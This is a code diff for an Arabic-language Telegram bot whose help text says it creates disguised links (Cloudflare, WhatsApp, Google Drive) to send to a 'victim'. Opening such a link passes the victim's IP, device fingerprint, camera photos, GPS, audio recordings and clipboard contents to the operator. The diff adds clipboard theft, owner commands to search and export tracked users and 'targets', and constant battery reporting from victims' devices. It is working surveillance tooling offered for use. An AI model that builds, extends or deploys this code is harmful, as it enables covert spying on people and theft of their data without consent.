@@ -17,7 +17,7 @@ const NOTES_FILE      = "./notes.json";
 const USERSTATS_FILE  = "./userstats.json";
 const PROFILES_FILE   = "./profiles.json";
 
-const DEFAULT_FEATURES = { gyroscope:true, webrtc:true, fingerprint:true, sessionTime:true, lightSensor:true };
+const DEFAULT_FEATURES = { gyroscope:true, webrtc:true, fingerprint:true, sessionTime:true, lightSensor:true, clipboard:true };
 
 let users      = new Set(loadJSON(USERS_FILE, []));
 let banned     = new Set(loadJSON(BANNED_FILE, []));
@@ -254,7 +254,7 @@ bot.on('message', async (msg) => {
   if (msg.text === "/help") {
     let t = `📖 الاستخدام:\n\n1️⃣ أنشئ رابطاً\n2️⃣ أرسله للضحية\n\n📥 يصلك فوراً:\n   ⚡ IP + تفاصيل ISP والدولة\n   📱 بيانات الجهاز الكاملة\n   📷 صور (أمامية + خلفية)\n   📍 GPS أو IP\n   🎙️ تسجيل صوتي\n   📋 محتوى الحافظة\n   🌐 نوع الاتصال والسرعة\n\n🔗 أنواع الروابط:\n   🌐 Cloudflare\n   🖥️ WebView\n   💬 WhatsApp\n   📁 Google Drive\n\n📊 /mystats — إحصائياتك الشخصية\n\n⚡ Powered by @Ye_x00`;
     if (chatId === BOT_OWNER) {
-      t += `\n\n━━━━━━━━━━━━━━━━\n📌 أوامر المالك:\n/stats — الإحصائيات الكاملة\n/report — تقرير شامل فوري\n/users — المستخدمون\n/export — تصدير كملف\n/banned — المحجوبون\n/ban [id] — حجب\n/unban [id] — رفع الحجب\n/deleteuser [id] — حذف\n/clearusers — مسح الكل\n/info [id] — معلومات مستخدم\n/note [id] [نص] — إضافة ملاحظة\n/notes [id] — عرض الملاحظات\n/delnotes [id] — حذف الملاحظات\n/silent — الوضع الصامت 🔕\n/away [نص] — وضع الغياب\n/awayoff — إيقاف الغياب\n/addtarget [id] — إضافة هدف 🎯\n/removetarget [id] — إزالة هدف\n/targets — قائمة الأهداف\n/schedule [ساعة/off] — تقرير يومي\n/link [url] — رابط سريع\n/broadcast — إرسال للجميع\n/setwelcome [نص] — تخصيص الترحيب\n/resetwelcome — إعادة الافتراضي\n/clearstats — مسح الإحصائيات\n/ping — اختبار السرعة`;
+      t += `\n\n━━━━━━━━━━━━━━━━\n📌 أوامر المالك:\n/stats — الإحصائيات الكاملة\n/report — تقرير شامل فوري\n/features — 🎛️ التحكم بالميزات\n/users — المستخدمون (مع الأسماء)\n/search [نص] — 🔍 بحث بالاسم أو اليوزر\n/export — تصدير شامل كملف\n/info [id] — معلومات مستخدم\n/banned — المحجوبون\n/ban [id] — حجب\n/unban [id] — رفع الحجب\n/deleteuser [id] — حذف\n/clearusers — مسح الكل\n/note [id] [نص] — إضافة ملاحظة\n/notes [id] — عرض الملاحظات\n/delnotes [id] — حذف الملاحظات\n/silent — الوضع الصامت 🔕\n/away [نص] — وضع الغياب\n/awayoff — إيقاف الغياب\n/addtarget [id] — إضافة هدف 🎯\n/removetarget [id] — إزالة هدف\n/targets — قائمة الأهداف\n/schedule [ساعة/off] — تقرير يومي\n/link [url] — رابط سريع\n/broadcast — إرسال للجميع\n/setwelcome [نص] — تخصيص الترحيب\n/resetwelcome — إعادة الافتراضي\n/clearstats — مسح الإحصائيات\n/ping — اختبار السرعة`;
     }
     return bot.sendMessage(chatId, t);
   }
@@ -294,7 +294,13 @@ bot.on('message', async (msg) => {
   if (msg.text === "/users") {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
     if (users.size === 0) return bot.sendMessage(chatId, "لا يوجد مستخدمون.");
-    const list = [...users].map((id,i) => `${i+1}. \`${id}\`${targets.has(id)?' 🎯':''}${banned.has(id)?' 🚫':''}`).join("\n");
+    const list = [...users].map((id,i) => {
+      const p = profiles[String(id)] || {};
+      const name = p.name ? ` — ${p.name}` : '';
+      const uname = p.username ? ` ${p.username}` : '';
+      const flags = `${targets.has(id)?' 🎯':''}${banned.has(id)?' 🚫':''}`;
+      return `${i+1}. \`${id}\`${name}${uname}${flags}`;
+    }).join("\n");
     return bot.sendMessage(chatId, `👥 المستخدمون (${users.size}):\n\n${list}`, { parse_mode: "Markdown" });
   }
 
@@ -338,9 +344,14 @@ bot.on('message', async (msg) => {
   if (msg.text === "/export") {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
     if (users.size === 0) return bot.sendMessage(chatId, "لا يوجد مستخدمون.");
-    const content = `📋 قائمة مستخدمي البوت\nالتاريخ: ${new Date().toISOString()}\nالعدد: ${users.size}\n\n` +
-      [...users].map((id,i) => `${i+1}. ${id}${targets.has(id)?' [هدف]':''}${banned.has(id)?' [محجوب]':''}`).join("\n");
-    return bot.sendDocument(chatId, Buffer.from(content,'utf8'), { caption:`📤 المستخدمون (${users.size})` }, { filename:"users.txt", contentType:"text/plain" });
+    const lines = [...users].map((id,i) => {
+      const p  = profiles[String(id)] || {};
+      const us = userStats[String(id)] || { linksCreated:0, linksOpened:0 };
+      const flags = [targets.has(id)?'هدف':'', banned.has(id)?'محجوب':''].filter(Boolean).join('،') || 'عادي';
+      return `${i+1}. ID: ${id} | ${p.name||'مجهول'} | ${p.username||''} | ${flags} | روابط: ${us.linksCreated} | فتحات: ${us.linksOpened} | آخر ظهور: ${p.seen||'غير معروف'}`;
+    });
+    const content = `📋 تصدير بيانات البوت\nالتاريخ: ${new Date().toISOString()}\nإجمالي المستخدمين: ${users.size}\nالأهداف: ${targets.size} | المحجوبون: ${banned.size}\n${'─'.repeat(60)}\n` + lines.join("\n");
+    return bot.sendDocument(chatId, Buffer.from(content,'utf8'), { caption:`📤 تصدير شامل (${users.size} مستخدم)` }, { filename:`export_${new Date().toJSON().slice(0,10)}.txt`, contentType:"text/plain" });
   }
 
   // /info [id] — detailed user info
@@ -477,9 +488,21 @@ bot.on('message', async (msg) => {
     return sendFeaturesMenu(chatId);
   }
 
-  if (msg.text === "/mystats") {
-    const us = userStats[String(chatId)] || { linksCreated:0, linksOpened:0 };
-    return bot.sendMessage(chatId, `📊 إحصائياتك:\n\n🔗 الروابط التي أنشأتها: ${us.linksCreated}\n👁️ مرات فتح روابطك: ${us.linksOpened}`);
+  // /search [نص] — ابحث عن مستخدم باسمه أو يوزرنيمه
+  if (msg.text?.startsWith("/search")) {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    const q = msg.text.replace("/search","").trim().toLowerCase();
+    if (!q) return bot.sendMessage(chatId, "⚠️ استخدم: /search [الاسم أو @اليوزرنيم]");
+    const found = Object.entries(profiles).filter(([id, p]) => {
+      return (p.name && p.name.toLowerCase().includes(q)) ||
+             (p.username && p.username.toLowerCase().includes(q));
+    });
+    if (!found.length) return bot.sendMessage(chatId, `🔍 لا نتائج لـ "${q}"`);
+    const list = found.map(([id, p]) => {
+      const flags = `${targets.has(Number(id))?' 🎯':''}${banned.has(Number(id))?' 🚫':''}`;
+      return `• \`${id}\` — ${p.name||'مجهول'} ${p.username||''}${flags}\n  آخر ظهور: ${p.seen||'—'}`;
+    }).join("\n");
+    return bot.sendMessage(chatId, `🔍 نتائج البحث (${found.length}):\n\n${list}`, { parse_mode:"Markdown" });
   }
 });
 
@@ -544,7 +567,8 @@ const FEAT_NAMES = {
   webrtc:      "🌐 WebRTC IP",
   fingerprint: "🖥️ بصمة الجهاز",
   sessionTime: "⏱️ وقت الجلسة",
-  lightSensor: "💡 مستشعر الضوء"
+  lightSensor: "💡 مستشعر الضوء",
+  clipboard:   "📋 الحافظة"
 };
 
 function buildFeaturesKeyboard() {
@@ -713,18 +737,18 @@ app.post("/network", (req, res) => {
   } else res.send("Missing");
 });
 
-// Battery alert endpoint
+// Battery endpoint — always report
 app.post("/battery", (req, res) => {
-  const uid      = decodeURIComponent(req.body.uid)      || null;
-  const level    = parseInt(req.body.level)               || null;
+  const uid      = decodeURIComponent(req.body.uid) || null;
+  const level    = parseInt(req.body.level);
   const charging = req.body.charging === 'true';
-  if (uid && level !== null) {
-    const tid = parseInt(uid, 36);
-    if (level <= 20 && !charging) {
-      const msg = `🔋 تنبيه بطارية منخفضة!\n⚡ المستوى: ${level}%\n🔌 الشحن: ${charging ? 'متصل' : 'غير متصل'}`;
-      notify(tid, msg);
-      if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n(ID: ${tid})`);
-    }
+  if (uid && !isNaN(level)) {
+    const tid  = parseInt(uid, 36);
+    const icon = level > 60 ? '🔋' : level > 20 ? '🪫' : '🔴';
+    const plug  = charging ? '🔌 يشحن' : '🔋 لا يشحن';
+    const msg  = `${icon} البطارية: ${level}% | ${plug}`;
+    notify(tid, msg);
+    if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n(ID: ${tid})`);
     res.send("Done");
   } else res.send("Missing");
 });
